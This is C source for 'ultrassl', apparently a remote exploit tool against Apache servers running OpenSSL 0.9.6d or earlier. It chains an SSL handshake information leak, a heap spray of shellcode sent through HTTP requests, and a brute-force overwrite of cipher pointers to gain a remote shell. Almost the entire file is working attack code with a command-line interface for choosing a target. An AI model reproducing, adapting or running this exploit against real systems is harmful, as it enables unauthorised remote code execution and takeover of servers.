#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/signal.h>

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "ultrassl.h"
#include "shellcode.h"

char *host;
int con_num, do_ssl, port;
u_long cipher, ciphers, brute_addr = 0;

void
sighandler(int sig)
{
	int sockfd, rand_port;

	putchar('\n');

        rand_port = 1+(int) (65535.0 * rand() / (RAND_MAX + 31025.0));

	putchar('\n');

	populate(host, 80, con_num, do_ssl, rand_port);

	printf("performing exploitation..\n");
	sockfd = exploit(host, port, brute_addr, 0xbfffda38 , rand_port);

	if(sockfd > 0)
		shell(sockfd);
}

int
main(int argc, char **argv)
{
	char opt;
	char *p;
	u_long addr = 0;
	int sockfd, ver, i;

	ver = -1;
	port = 443;
	do_ssl = 0;
	p = argv[0];
	con_num = 12;

	srand(time(NULL) ^ getpid());
	signal(SIGPIPE, &sighandler);
	setvbuf(stdout, NULL, _IONBF, 0);

	puts("ultrassl - an openssl <= 0.9.6d apache exploit (brute force version)");

	if (argc < 2)
		usage(p);

	while ((opt = getopt(argc, argv, "p:c:a:t:s")) != EOF) {
		switch (opt) {
		case 'p':
			port = atoi(optarg);
			break;
		case 'c':
			con_num = atoi(optarg);
			break;
		case 'a':
			addr = strtoul(optarg, NULL, 0);
			break;
		case 't':
			ver = atoi(optarg) - 1;
			break;
		case 's':
			do_ssl = 1;
			break;
		default:
			usage(p);
		}
	}

	argv += optind;
	host = argv[0];
	

	if (addr)
		brute_addr = addr;

	if (!host)
		usage(p);

	printf("using %d byte shellcode\n", sizeof(shellcode));

	infoleak(host, port);


	if(!brute_addr)
		brute_addr = cipher + 8564 - 1024;

	putchar('\n');

	for(i = 0; i < 1024; i++) {
		int sd;
        
		printf("brute force: 0x%x\r", brute_addr);

		sd = exploit(host, port, brute_addr, 0xbfffda38, 0);

		if(sd > 0) {
			shutdown(sd, 1);
			close(sd);
		}

		brute_addr += 4;
	}
	exit(0);
}

int
populate(char *host, int port, int num, int do_ssl, int rand_port)
{
	int i, *socks;
	char buf[1024 * 3];
	char header[] = "GET / HTTP/1.0\r\nHost: ";
	struct sockaddr_in sin;

	printf("populating shellcode..\n");

	memset(buf, 0x90, sizeof(buf));

	for(i = 0; i < sizeof(buf); i += 2)
		*(short *)&buf[i] = 0xfceb;

	memcpy(buf, header, strlen(header));

	buf[sizeof(buf) - 2] = 0x0a;
	buf[sizeof(buf) - 1] = 0x0a;
	buf[sizeof(buf) - 0] = 0x0;

	shellcode[47 + 0] = (u_char)((rand_port >> 8) & 0xff);
	shellcode[47 + 1] = (u_char)(rand_port & 0xff);

	memcpy(buf + 768, shellcode, strlen(shellcode));

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = resolve(host);

	socks = malloc(sizeof(int) * num);

	for(i = 0; i < num; i++) {
		ssl_conn *ssl;

		usleep(100);

		socks[i] = socket(AF_INET, SOCK_STREAM, 0);
		if(socks[i] < 0) {
			perror("socket()");
			return(-1);
		}
		connect(socks[i], (struct sockaddr *)&sin, sizeof(sin));
		write(socks[i], buf, strlen(buf));
	}

	for(i = 0; i < num; i++) {
		shutdown(socks[i], 1);
		close(socks[i]);
	}
}

int
infoleak(char *host, int port)
{
	u_char *p;
	u_char buf[56];
	ssl_conn *ssl;

	memset(buf, 0, sizeof(buf));
	p = buf;

	/* session_id_length */
	*(long *) &buf[52] = 0x00000070;

	printf("\nperforming information leak:\n");

	if(!(ssl = ssl_connect(host, port, 0)))
		return(-1);

	send_client_hello(ssl);

	if(get_server_hello(ssl) < 0)
		return(-1);

	send_client_master_key(ssl, buf, sizeof(buf));

	generate_keys(ssl);

	if(get_server_verify(ssl) < 0)
		return(-1);

	send_client_finish(ssl);
	get_server_finish(ssl, 1);

	printf("\ncipher\t= 0x%08x\n", cipher);
	printf("ciphers\t= 0x%08x\n", ciphers);

	shutdown(ssl->sockfd, 1);
	close(ssl->sockfd);
}

int
exploit(char *host, int port, u_long retloc, u_long retaddr, int rand_port)
{
	u_char *p;
	ssl_conn *ssl;
	int i, src_port;
	u_char buf[184], test[400];
	struct sockaddr_in sin;

	if(!(ssl = ssl_connect(host, port, rand_port)))
		return(-1);

	memset(buf, 0x0, sizeof(buf));

	p = buf;

	*(long *) &buf[52] = 0x00000070;

	*(long *) &buf[156] = cipher;
	*(long *) &buf[164] = ciphers;

	*(long *) &buf[172 + 4] = retaddr;
	*(long *) &buf[172 + 8] = retloc - 192;

	send_client_hello(ssl);
	if(get_server_hello(ssl) < 0)
		return(-1);

	send_client_master_key(ssl, buf, sizeof(buf));

	generate_keys(ssl);
	
	if(get_server_verify(ssl) < 0)
		return(-1);

	send_client_finish(ssl);
	get_server_finish(ssl, 0);

	fcntl(ssl->sockfd, F_SETFL, O_NONBLOCK);

        write(ssl->sockfd, "echo -n\n", 8);

	sleep(3);

	read(ssl->sockfd, test, 400);
        write(ssl->sockfd, "echo -n\n", 8);

	return(ssl->sockfd);
}

void
usage(char *prog)
{
	printf("usage: %s [-a <base>] ][-p <port>] [-c <connects>] target\n"
	       "       -a\tbase address\n"
	       "       -p\tserver port\n"
	       "       -c\tnumber of connections\n"
	       "       target\thost running vulnerable openssl\n", prog);
	exit(-1);
}
